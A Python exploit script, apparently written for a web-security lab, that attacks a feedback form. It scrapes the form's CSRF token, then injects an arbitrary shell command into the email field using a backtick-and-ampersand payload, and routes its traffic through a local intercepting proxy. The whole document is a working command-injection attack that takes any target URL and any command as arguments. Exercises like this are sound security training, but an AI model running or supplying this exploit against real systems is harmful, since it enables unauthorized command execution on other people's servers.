import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

# disable the ssl warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# set up the proxy
proxies={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080',
}

def csrf_token(url):
    #csrf path
    csrf_path = '/feedback'
    #get the csrf token
    res=requests.get(url+csrf_path,verify=False,proxies=proxies)
    if res.status_code==200:
        session_cookie_value = res.cookies.get('session')

        print(session_cookie_value)
    #parsing the token
    soup=BeautifulSoup(res.text,'html.parser')
    
    # now getting the token from the input field
    csrf_token=soup.find('input',{
        'name':'csrf'
    }) ['value']
    return csrf_token



def injecting_command(url,command):
    # get csrf
    token=csrf_token(url)
    print(f"\nThe csrf token is :{token}")
    
    # vulnerable path
    vuln_path= url + '/feedback/submit'
    command_injection= ' & ' + f'` {command} + 5`'
    data={
        
        "csrf":token,
        "name":"test",
        "email":"test" + command_injection,
        "subject":"just a test",
        "message": "okayyy"
        
    }
    # now we will be sending the request hai
    r=requests.post(vuln_path,data=data,verify=False,proxies=proxies)
    res=r.text
    print(res)
    
    

if __name__=="__main__":
    if len(sys.argv)!=3:
        print("[+] Usage: %s <url> <command>" % sys.argv[0])
        print("[+] Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)
    else:
        url=sys.argv[1]    
        command=sys.argv[2]
        print("[+] Exploiting command injection...🔥")   
        injecting_command(url,command) 
        